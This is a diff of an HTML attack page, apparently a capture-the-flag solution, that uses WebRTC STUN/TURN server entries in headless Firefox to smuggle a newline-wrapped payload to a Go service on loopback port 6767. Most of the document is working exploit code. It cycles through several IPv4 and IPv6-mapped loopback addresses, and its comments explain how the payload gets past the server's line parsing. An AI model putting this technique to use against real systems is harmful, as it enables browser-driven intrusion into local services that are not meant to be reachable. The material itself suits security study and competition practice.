@@ -4,43 +4,44 @@
     <title>Exploit Matrix Final</title>
 </head>
 <body>
-    <h1>Processing network adjustments...</h1>
+    <h1>Processing network routes...</h1>
     <script>
-        // The Go server splits buffers up to a newline character.
-        // Prefixing with an inline break forces the network stack junk 
-        // to line 1, keeping line 2 entirely clear for verification.
+        // The Go backend splits buffers up to a newline character.
+        // Prefixing with a newline drops any residual socket junk to line 1,
+        // leaving our target string perfectly clear on line 2.
         const payload = "\ngive me the flag bro\n";
 
-        function trickleExploit(ipAddress) {
+        function firePacket(targetUri) {
             try {
-                const pc = new RTCPeerConnection();
+                const pc = new RTCPeerConnection({
+                    iceServers: [{
+                        urls: targetUri,
+                        username: payload,
+                        credential: "x"
+                    }]
+                });
                 pc.createDataChannel("trigger");
-
-                pc.createOffer().then(offer => {
-                    return pc.setLocalDescription(offer);
-                }).then(() => {
-                    // Inject a mock network candidate natively into the ICE layer.
-                    // This bypasses the typical credential limits by forcing Firefox 
-                    // to execute a raw transmission routing test directly on loopback.
-                    const rtcCand = new RTCIceCandidate({
-                        candidate: `candidate:1 1 UDP 1 ${ipAddress} 6767 typ host typ ${payload}`,
-                        sdpMid: "0",
-                        sdpMLineIndex: 0
-                    });
-                    pc.addIceCandidate(rtcCand);
-                }).catch(e => {});
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
             } catch(e) {}
         }
 
-        // Broad spectrum loopback targeting array
-        trickleExploit("127.0.0.1");
-        trickleExploit("[::1]");
-        trickleExploit("[::ffff:127.0.0.1]");
+        // We wrap the loopback target inside the IPv6-mapped IPv4 structure [::ffff:127.0.0.1]
+        // This forces Firefox's IPv6-preferred stack to execute the raw binding test.
+        const vectors = [
+            "stun:[::ffff:127.0.0.1]:6767",
+            "turn:[::ffff:127.0.0.1]:6767",
+            "stun:[0000:0000:0000:0000:0000:ffff:7f00:0001]:6767",
+            "turn:[0000:0000:0000:0000:0000:ffff:7f00:0001]:6767"
+        ];
 
-        // Release the browser execution context safely after 2 seconds
+        vectors.forEach((uri, i) => {
+            setTimeout(() => firePacket(uri), i * 100);
+        });
+
+        // Redirect within 1.5 seconds to exit headless Firefox and release the Go server mutex
         setTimeout(() => {
             window.location.href = "about:blank";
-        }, 2000);
+        }, 1500);
     </script>
 </body>
 </html>
